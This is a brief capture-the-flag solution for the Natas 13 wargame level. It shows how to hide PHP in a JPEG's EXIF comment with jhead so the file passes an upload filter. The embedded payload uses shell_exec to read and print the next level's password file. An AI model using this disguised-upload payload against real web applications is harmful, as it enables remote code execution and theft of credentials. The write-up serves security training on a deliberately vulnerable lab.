# Natas 13 solution

1. Get jpg cat image, make it < 1kb
2. Clean image (delete extra headers): `jhead -purejpg <filename>.jpg`
3. Edit exif comment `jhead -ce <filename>.jpg`
```php
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo $output;
 __halt_compiler();
 ```
 
 4. upload file and voila
